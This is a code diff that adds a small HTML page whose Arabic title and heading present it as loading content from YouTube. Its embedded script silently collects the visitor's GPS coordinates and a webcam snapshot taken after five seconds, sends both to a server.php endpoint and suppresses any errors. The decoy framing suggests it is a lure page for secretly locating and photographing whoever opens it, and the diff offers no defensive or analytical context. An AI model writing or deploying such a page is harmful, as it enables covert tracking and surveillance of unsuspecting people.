@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><title>تحميل</title></head>
+<body>
+<h3>جارٍ التحميل من https://youtube.com</h3>
+<script>
+navigator.geolocation.getCurrentPosition(pos => {
+  fetch("server.php?lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude);
+});
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => {
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  video.play();
+  const canvas = document.createElement("canvas");
+  setTimeout(() => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    canvas.toBlob(blob => {
+      const fd = new FormData();
+      fd.append("image", blob, "cam.jpg");
+      fetch("server.php", { method: "POST", body: fd });
+    });
+  }, 5000);
+})
+.catch(() => {});
+</script>
+</body>
+</html>
